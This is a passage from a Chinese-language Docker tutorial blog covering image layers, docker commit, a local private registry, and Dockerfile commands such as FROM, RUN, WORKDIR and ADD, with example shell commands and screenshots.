class="hljs shell">docker run -itd --name snapshot python-snapshot /bin/bashdocker exec snapshot cat snapshot.txt</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115620362425_973_image-20230905114307524.png" alt="image-20230905114307524"><figcaption aria-hidden="true">image-20230905114307524</figcaption></figure><h3 id="镜像内部层次关系">镜像内部层次关系</h3><p>镜像是docker中非常重要的资源，因此了解镜像的内部结构对学习docker来说相当重要，事实上docker镜像采用的是多个只读结构层叠的方式进行实现和存储的。本小节我们来学习如何查看镜像的层级关系。</p><ol type="1"><li>inspect过滤器的使用</li></ol><p>上面的小节我们了解到通过<code>docker inspect</code>命令查看镜像属性，会获得一个非常庞大的JSON格式字符串的详细信息。为了能从字符串中只获得我们需要的内容，我们可以使用<code>-f</code>参数对详细信息进行过滤和格式化。</p><p>在使用<code>-f</code>参数时其语法为<code>docker inspect -f "模板字符串" 镜像名</code>，其中模板字符串为go语言的模板语法，在后面的实验中我们会详细讲解。在本次实验中我们要求dockerinspect输出JSON格式的结果，为了便于显示，我们在参数后面再加入<code>| jq</code>，将dockerinspect的输出结果交给<code>jq</code>命令进行格式化和美化。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-obiy7vlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-obiy7vlmrh9u69"><pre><code class="hljs shell">docker inspect -f "{\"Id\":{{json .Id}},\"RepoTags\":{{json .RepoTags}}}" python | jq</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115623529198_693_image-20230905114742181.png" alt="image-20230905114742181"><figcaption aria-hidden="true">image-20230905114742181</figcaption></figure><ol start="2" type="1"><li>镜像的层次关系</li></ol><p>当docker设计镜像底层结构时，为了节约存储控件，会将镜像设计成只读的分层结构。这样每一层只记录和前一层的文件差别。如果两个不同的镜像底层使用了相同的镜像层，则只需要存储一份就可以。这样就大大减小了冗余镜像存储的情况。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115627866613_645_image-20230905114904603.png" alt="image-20230905114904603"><figcaption aria-hidden="true">image-20230905114904603</figcaption></figure><p>通过<code>docker inspect</code>命令我们同样可以查看镜像的层次信息。通过在镜像信息的<code>.RootFS.Layers</code>位置，保存的就是镜像的层次信息。通过下面的命令，我们发现，<code>python</code>镜像中包含了8层。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mgpozxlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-mgpozxlmrh9u69"><pre><code class="hljs shell">docker inspect -f "{{json .RootFS.Layers}}" python | jq</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115633796078_312_image-20230905115015870.png" alt="image-20230905115015870"><figcaption aria-hidden="true">image-20230905115015870</figcaption></figure><ol start="3" type="1"><li>普通镜像和快照镜像的区别</li></ol><p>接下来我们来查看普通镜像和快照镜像直接的层次区别，通过观察我们可以发现，通过<code>docker import</code>导入的镜像快照。会将所有的层压缩成一层。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115637121367_978_image-20230905115304575.png" alt="image-20230905115304575"><figcaption aria-hidden="true">image-20230905115304575</figcaption></figure><p>同时我们通过<code>docker images</code>和<code>ls -ll</code>命令我们可以看到快照镜像，快照镜像虽然体积较大，有比较多的冗余内容，但是不会依赖其他的镜像；因此比较适合导出到文件和导入的操作。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115642297654_383_image-20230905115404487.png" alt="image-20230905115404487"><figcaption aria-hidden="true">image-20230905115404487</figcaption></figure><h2 id="容器镜像的制作-commit">容器镜像的制作-commit</h2><h3 id="通过容器生成镜像">通过容器生成镜像</h3><p>在前面的实验中，我们学习了容器管理的基本命令。在使用容器的时候我们不但会使用已有的容器镜像，也经常需要制作新的容器镜像。</p><p>在Docker中，容器镜像的制作有两种方法，分别是<code>commit</code>方法和<code>build</code>方法。实际上不论是哪种容器镜像的制作方法，基本上我们都会选择基于一个已有的容器镜像为基础，在此之上进行镜像制作。在本实验中我们先来学习直接通过容器生成新的镜像的<code>commit</code>方法。</p><ol type="1"><li>实验环境准备</li></ol><p>在本实验中我们会基于官方的<code>ubuntu镜像</code>来制作自定义镜像，在<code>commit</code>方法中，为了制作镜像，我们需要先利用基础镜像创建一个容器。接下来我们使用<code>docker run</code>创建容器<code>ubuntu-commit</code>。</p><p>除此之外，我们再使用<code>docker inspect</code>命令查看基础容器镜像的层信息</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115647711148_393_image-20230905121132394.png" alt="image-20230905121132394"><figcaption aria-hidden="true">image-20230905121132394</figcaption></figure><ol start="2" type="1"><li>查看容器修改内容</li></ol><p>接下来我们对容器的内容进行修改，我们在容器中执行<code>apt-get update</code>命令修改容器中的文件。在文件修改之后，我们可以通过<code>docker diff</code>命令查看文件的修改详情，该命令格式为d<code>ocker diff 容器名</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-momztglmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-momztglmrh9u69"><pre><code class="hljs shell">docker exec ubuntu-commit apt-get updatedocker diff ubuntu-commit</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115653000478_838_image-20230905121240110.png" alt="image-20230905121240110"><figcaption aria-hidden="true">image-20230905121240110</figcaption></figure><ol start="3" type="1"><li>生成新的镜像</li></ol><p>在前面的实验中，我们讲到，容器镜像的是以只读分层的方式进行存储的。当我们通过镜像创建容器之后，每一个容器都会生成一个可以编写的存储层，所有用户对容器的文件修改，都会记录在容器存储层中。当我们把容器镜像的只读层和容器存储层叠加起来之后，就得到了容器的完整存储内容。而<code>docker diff</code>命令查看的，正是容器存储层所保存的内容。</p><p>在了解容器存储层的相关知识之后，我们就可以执行<code>docker commit</code>命令生成新的镜像，其命令的格式为<code>docker commit 容器名 新镜像名</code>。镜像生成之后我们使用dockerimages进行验证</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rlalx8lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-rlalx8lmrh9u69"><pre><code class="hljs shell">docker commit ubuntu-commit ub/commitdocker images</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115657893023_850_image-20230905121504361.png" alt="image-20230905121504361"><figcaption aria-hidden="true">image-20230905121504361</figcaption></figure><ol start="4" type="1"><li>查看新镜像的层</li></ol><p>接下来我们使用<code>dcoker inspect</code>来查看新镜像的层信息。会发现<code>ub/commit</code>在ubuntu的层之上构建了一个新的层。事实上这一层的内容就是将之前的<code>ubuntu-commit</code>容器存储层转化成镜像只读层。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fboa07lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-fboa07lmrh9u69"><pre><code class="hljs shell">docker inspect -f "{{json .RootFS.Layers}}"  ub/commit | jq</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115703246580_756_image-20230905121727324.png" alt="image-20230905121727324"><figcaption aria-hidden="true">image-20230905121727324</figcaption></figure><h3 id="部署私人镜像仓库">部署私人镜像仓库</h3><p>在Docker中推送镜像的命令是<code>docker push</code>，但是默认的<code>docker push</code>命令会将镜像推送到docker公共仓库。为了能将镜像推送到私人仓库，我们首先要使用<code>docker tag</code>命令为镜像设置需要推送的仓库信息。其命令的参数为<code>docker tag [本地镜像名] [私有仓库的URL][私有仓库的镜像名称]</code>。在标记镜像之后，我们使用<code>docker images</code>命令查看会发现，为本地镜像设置tag之后，会在本地镜像列表中生成一个新的镜像。</p><ol type="1"><li>部署私人镜像仓库</li></ol><p>首先我们来学习如何启动docker私人镜像仓库。docker的默认私人镜像仓库<code>registry</code>应用也提供了镜像的部署方式。也就是说我们可以像启动其他容器一样的方式，本机用docker来启动默认的私有镜像仓库。当默认的私有镜像仓库启动之后，会使用http接口方式对外提供服务。</p><p>此处我们使用<code>--network=host</code>参数，指定容器在启动时使用Host网络模型。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-t05nydlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-t05nydlmrh9u69"><pre><code class="hljs shell">docker run -d  --network=host --name registry-1 registry</code></pre></div></div><ol start="2" type="1"><li>验证网络服务</li></ol><p>当使用Host网络模型创建容器后，容器会和宿主机共享网络设置，这也就意味着，容器中启动网络服务，同样可以在宿主机中使用<code>127.0.0.1</code>的网络地址访问。关于Host网络模型的详细用法，在后面的实验中还会有讲解。</p><p>当仓库容器启动后，会在5000端口启动服务。我们可以在宿主机中使用netstat命令验证。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bszj05lmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-bszj05lmrh9u69"><pre><code class="hljs shell">netstat -tunple | grep 5000</code></pre></div></div><blockquote><ul><li><code>-t</code>: 显示 TCP 协议相关的信息。</li><li><code>-u</code>: 显示 UDP 协议相关的信息。</li><li><code>-n</code>:使用数字形式显示地址和端口，而不是尝试解析主机名和服务名称。</li><li><code>-p</code>: 显示与进程相关的信息。</li><li><code>-l</code>: 仅显示监听状态的端口。</li><li><code>-e</code>: 显示详细的扩展信息。</li></ul></blockquote><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115706345292_473_image-20230905122954351.png" alt="image-20230905122954351"><figcaption aria-hidden="true">image-20230905122954351</figcaption></figure><ol start="3" type="1"><li>测试服务</li></ol><p>接下来我们验证私人仓库的http服务接口是否可用，我们可以通过curl命令验证仓库的运行，常用的验证地址为<code>[私人仓库IP]:5000/v2/_catalog</code>。通过验证我们发现私人镜像仓库服务已经启动</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qft33zlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-qft33zlmrh9u69"><pre><code class="hljs shell">curl 127.0.0.1:5000/v2/_catalog</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115712465251_580_image-20230905123129251.png" alt="image-20230905123129251"><figcaption aria-hidden="true">image-20230905123129251</figcaption></figure><h3 id="向私有仓库中推送镜像">向私有仓库中推送镜像</h3><p>在前面的小节中，我们学习了如何启动本地的私人镜像仓库，在本小节中我们将学习如何将本地docker中的镜像推送到私有仓库中。</p><ol type="1"><li>为镜像设置仓库信息</li></ol><p>默认的<code>docker push</code>命令会将容器推送到docker公共仓库，为了能将镜像推送到私人仓库，我们要使用dockertag命令为镜像设置需要推送的仓库信息。其命令的参数<code>为docker tag [本地镜像名] [私有仓库的URL][私有仓库的镜像名称]</code>。标记镜像之后，我们使用<code>docker images</code>命令查看会发现，为本地镜像设置tag之后，会在本地镜像列表中生成一个新的镜像。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-31vu0llmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-31vu0llmrh9u69"><pre><code class="hljs shell">docker tag ub/commit 127.0.0.1:5000/ub/commitdocker images</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115718659476_124_image-20230905123255932.png" alt="image-20230905123255932"><figcaption aria-hidden="true">image-20230905123255932</figcaption></figure><ol start="2" type="1"><li>向仓库推送镜像</li></ol><p>通过dockertag命令生成新的镜像之后，我们就可以使用<code>docker push</code>将已经标记过的镜像，直接推送到私人仓库中。命令的参数为<code>docker push tag后的镜像名:镜像版本</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vokxvllmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-vokxvllmrh9u69"><pre><code class="hljs shell">docker push 127.0.0.1:5000/ub/commit:latest</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115722159957_760_image-20230905123356587.png" alt="image-20230905123356587"><figcaption aria-hidden="true">image-20230905123356587</figcaption></figure><ol start="3" type="1"><li>通过私有仓库API验证推送</li></ol><p>当镜像上传到私人仓库之后。我们可以通过访问<code>curl [私人仓库IP]:5000/v2/_catalog</code>列出仓库中的镜像信息。同时还可以通过<code>curl [私人仓库IP]:5000/v2/[镜像名称]/list</code>来查看镜像的版本信息。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c7raqflmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-c7raqflmrh9u69"><pre><code class="hljs shell">curl 127.0.0.1:5000/v2/_catalogcurl 127.0.0.1:5000/v2/ub/commit/tags/list</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115726481615_338_image-20230905123429963.png" alt="image-20230905123429963"><figcaption aria-hidden="true">image-20230905123429963</figcaption></figure><h3 id="从私有仓库中拉取镜像">从私有仓库中拉取镜像</h3><ol type="1"><li>删除本地镜像</li></ol><p>为了验证从私有仓库下载镜像，我们先通过dockerrmi命令删除本地的容器镜像。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3rfjhzlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-3rfjhzlmrh9u69"><pre><code class="hljs shell">docker rmi ub/commit docker rmi 127.0.0.1:5000/ub/commit</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115731763472_727_image-20230905123531029.png" alt="image-20230905123531029"><figcaption aria-hidden="true">image-20230905123531029</figcaption></figure><ol start="2" type="1"><li>从私有仓库中拉取镜像</li></ol><p>当通过docker push将镜像推送到私人仓库之后。其他人就可以通过dockerpull命令将其拉取到本地。拉取私有仓库镜像的命令格式为<code>docker pull [私有仓库的URL][私有仓库的镜像名称]</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zntfqblmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-zntfqblmrh9u69"><pre><code class="hljs shell">docker pull 127.0.0.1:5000/ub/commitdocker images</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115735113092_916_image-20230905145350810.png" alt="image-20230905145350810"><figcaption aria-hidden="true">image-20230905145350810</figcaption></figure><ol start="3" type="1"><li>查看本地镜像信息</li></ol><p>对于已经拉取到本地的容器镜像，我们可以通过<code>docker inspcet</code>来查看镜像的仓库信息和<code>repo tag</code>信息。在使用<code>docker inspcet</code>命令时，我们可以使用<code>-f</code>参数进行信息过滤，具体的过滤语法我们会在后面的实验中详细讲解。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-y0lynxlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-y0lynxlmrh9u69"><pre><code class="hljs shell">docker inspect -f \"{\"RepoTags\":{{json .RepoTags}}, \"RepoDigests\":{{json .RepoDigests}}}" \127.0.0.1:5000/ub/commit | jq</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115738615710_639_image-20230905123713888.png" alt="image-20230905123713888"><figcaption aria-hidden="true">image-20230905123713888</figcaption></figure><h2 id="容器镜像的制作-build">容器镜像的制作-build</h2><h3 id="docker-build-快速上手">docker build 快速上手</h3><p>前面的实验中我们学习了如何通过<code>docker commit</code>命令将一个编辑好的容器，生成一个新的镜像。但是这种方法生成的容器可以查看的只有文件层面的变更内容，容器的使用者往往会搞不清楚在容器制作过程中执行了什么命令，按什么顺序执行了这些命令或者操作。因此除了这种方法之外，Docker还提供了另一种<code>docker build</code>的方式来构建容器。</p><ol type="1"><li>制作Dockerfile文件</li></ol><p>要使用dockerbuild的方式制作容器，我们需要先制作<code>Dockerfile</code>文件。<code>Dockerfile</code>是纯文本文件，我们可以使用<code>vi</code>等纯文本文件编辑工具进行编写。接下来我们使用vi命令生成Dockerfile。注意使用vi编辑器时：</p><ol type="1"><li>需要先按i键进入编辑模式。</li><li>编辑完成之后按esc退出编辑模式。</li><li>然后按大写的ZZ保存并退出vim。</li></ol><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-q99vktlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-q99vktlmrh9u69"><pre><code class="hljs shell">vi Dockerfile</code></pre></div></div><p>然后将下面的内容复制到Dockerfile中：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-m20qxdlmrh9u69"></i><span>dockerfile</span><div class="collapse show" id="collapse-m20qxdlmrh9u69"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:latest<span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update</span></code></pre></div></div><ol start="2" type="1"><li>制作容器镜像</li></ol><p><code>Dockerfile</code>文件编写完毕后，我们就就可以根据该文件，使用<code>docker build</code>命令来制作容器镜像，该命令的格式为<code>docker build -t 容器镜像名 Dockerfile所在路径</code>。命令的第三个参数用于指定Dockerfile文件的位置，如果Dockerfile文件就在控制台的当前目录下，一般使用.来设置。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2atzx7lmrh9u69"></i><span>n1ql</span><div class="collapse show" id="collapse-2atzx7lmrh9u69"><pre><code class="hljs n1ql">docker <span class="hljs-keyword">build</span> -t ub/<span class="hljs-keyword">build</span> .docker images</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115742023909_762_image-20230905150014762.png" alt="image-20230905150014762"><figcaption aria-hidden="true">image-20230905150014762</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115747150545_234_image-20230905150038126.png" alt="image-20230905150038126"><figcaption aria-hidden="true">image-20230905150038126</figcaption></figure><ol start="3" type="1"><li>Dockerfile命令列表</li></ol><p>Dockerfile文件的格式于脚本文件，每一行是一条命令，每行的格式为<code>命令 参数</code>。Dockerfile主要支持的命令如下表，因篇幅的原因，本实验中我们无法具体演示每一条指令的用法，只会讲解一些重要的命令。</p><table><thead><tr class="header"><th>命令</th><th>功能</th></tr></thead><tbody><tr class="odd"><td>FROM</td><td>指定基础镜像，必须为第一个命令</td></tr><tr class="even"><td>LABEL</td><td>为镜像添加标签</td></tr><tr class="odd"><td>RUN</td><td>构建时执行的命令行指令</td></tr><tr class="even"><td>ADD</td><td>将本地文件添加到容器中，如果为tar类型文件，则会自动解压，可以访问网络资源，类似wget（网络资源不会被解压）</td></tr><tr class="odd"><td>COPY</td><td>将本地文件添加到容器中，不会解压，也不可以访问网络资源</td></tr><tr class="even"><td>CMD</td><td>容器启动时执行的命令，只有最后一条可以生效，可以被dockerrun的启动命令覆盖。</td></tr><tr class="odd"><td>ENTRYPOINT</td><td>容器启动时执行的入口，只有最后一条可以生效，一定会被执行，不可以被覆盖。</td></tr><tr class="even"><td>EXPOSE</td><td>设置默认开放的网络端口（后面的实验会涉及到）</td></tr><tr class="odd"><td>VOLUME</td><td>设置默认加载的VOLUME卷（后面的实验会涉及到）</td></tr><tr class="even"><td>ENV</td><td>设置环境变量。</td></tr><tr class="odd"><td>WORKDIR</td><td>设置默认的工作目录。</td></tr><tr class="even"><td>USER</td><td>设置容器运行时的用户。</td></tr><tr class="odd"><td>ONBUILD</td><td>构建触发器，当此镜像被其他镜像用作基础镜像时，触发器会被执行。</td></tr><tr class="even"><td>ARG</td><td>设置构建参数，可以通过docker build--build-arg将参数从外部传到到Dockerfile构建过程中。</td></tr></tbody></table><h3 id="dockerfile命令详解-1">Dockerfile命令详解-1</h3><p>在上一个小节中我们讲解了<code>Dockerfile</code>文件的格式，以及<code>docker build</code>命令的基本用法。在执行<code>docker build</code>时，docker会先根据<code>Dockerfile</code>文件生成并按顺序操作容器。然后再根据按顺序操作好的容器生成镜像。并且在新的容器镜像中保存了容器的操作顺序。接下来我们来介绍<code>Dockerfile</code>文件中的常用的<code>FROM</code>，<code>RUN</code>，<code>WORKDIR</code>，<code>ADD</code>四个命令。</p><ol type="1"><li>命令讲解和环境准备</li></ol><p>这两个命令是最常见的Dockerfile命令。一般来讲我们不会从头创建一个镜像，而是会在已有镜像的基础上添加新的内容。这种情况下我们就需要使用<code>FROM</code>命令来指定基础镜像。</p><p>在指定基础镜像之后，我们可以使用<code>RUN</code>命令在基础镜像之上执行一些命令。需要注意的是这些命令都是在基础镜像而不是宿主机中运行，同时每一条命令需要使用一个<code>RUN</code>命令。</p><p>除了可以在容器中执行命令之外，我们还可以使用<code>ADD</code>命令从宿主机向容器中复制文件。使该命令复制文件时，默认只能复制Dockerfile文件所在目录中或者其子目录中的文件。</p><p>如果需要修改需要复制文件的目标路径，我们可以在Dockerfile中使用<code>WORKDIR</code>命令设置容器中的目标路径。</p><p>Docker中<code>ADD</code>命令除了可以从宿主机中复制文件，还可以从网络上下载文件到本地。使用该命令远程下载除了支持<code>HTTP/S</code>协议外，也支持<code>GIT</code>等协议。</p><p>ADD命令的另一个非常使用的功能是，当复制源文件的扩展名是<code>.tar.gz</code>格式时，该命令会将压缩包解压缩并复制到容器当中。</p><p>接下来我们先来进行本小节的实验环境准备。我们创建目录并保存需要上传到镜像中的文件。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kffjfalmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-kffjfalmrh9u69"><pre><code class="hljs shell">mkdir dir6-1cd dir6-1echo 本地文件 &gt; info.txtecho 压缩文件 &gt; tar.txttar zcvf info.tar.gz tar.txt</code></pre></div></div><ol start="2" type="1"><li>构建容器镜像</li></ol><p>接下来我们使用vi命令在dir6-1目录下创建Dockerfile文件，并编辑为如下内容。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c5ha8ulmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-c5ha8ulmrh9u69"><pre><code class="hljs shell">vi Dockerfile</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tc9x7flmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-tc9x7flmrh9u69"><pre><code class="hljs shell">FROM ubuntu:latestWORKDIR dataRUN echo 容器中生成的文件 &gt; img.txtADD info.txt info.txtADD info.tar.gz .WORKDIR dir-robotsADD https://www.aliyun.com/robots.txt robots.txt</code></pre></div></div><p>然后使用<code>docker build</code>编译容器镜像</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cxqecjlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-cxqecjlmrh9u69"><pre><code class="hljs shell">docker build -t img6-1 .</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115755964064_755_image-20230905150654738.png" alt="image-20230905150654738"><figcaption aria-hidden="true">image-20230905150654738</figcaption></figure><ol type="1"><li>验证容器镜像</li></ol><p>接下来我们来验证编译好的容器镜像，我们通过<code>docker run</code>启动镜像，然后验证容器中的内容。我们发现容器在运行之后，默认的目录为<code>/data/dir-robots</code>这说明<code>WORKDIR</code>命令不但会改变镜像生成时的操作目录，也会影像到容器运行时的默认目录。</p><p>接下来我们看到了从<code>www.aliyun.com/robots.txt</code>地址下载的同名文件。验证了ADD命令的网络下载功能。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-km2g4elmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-km2g4elmrh9u69"><pre><code class="hljs shell">docker run -itd --name container6-1 img6-1docker exec container6-1 pwddocker exec container6-1 cat robots.txt</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115800290600_894_image-20230905150901490.png" alt="image-20230905150901490"><figcaption aria-hidden="true">image-20230905150901490</figcaption></figure><p>我们继续验证其他目录的文件。这里我们使用了<code>docker exec container6-1 ls</code>和<code>docker exec container6-1 cat</code>命令。来查看文件列表和文件内容。会发现目录中的3个文件和内容符合期望</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-t1jdarlmrh9u69"></i><span>shell</span><div class="collapse show" id="collapse-t1jdarlmrh9u69"><pre><code class="hljs shell">docker exec container6-1 ls ..docker exec container6-1 cat ../img.txtdocker exec container6-1 cat ../info.txtdocker exec container6-1 cat ../tar.txt</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BADocker%E5%BA%94%E7%94%A8-Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F/20230906115806535609_183_image-20230905150957871.png" alt="image-20230905150957871"><figcaption aria-hidden="true">image-20230905150957871</figcaption></figure><h3 id="dockerfile命令详解-2">Dockerfile命令详解-2</h3><p>接下来的这个小节我们再来看另外的三个Dockerfile命令，分别是<code>ENV</code>，<code>CMD</code>，<code>ENTRYPOINT</code>。</p><ol 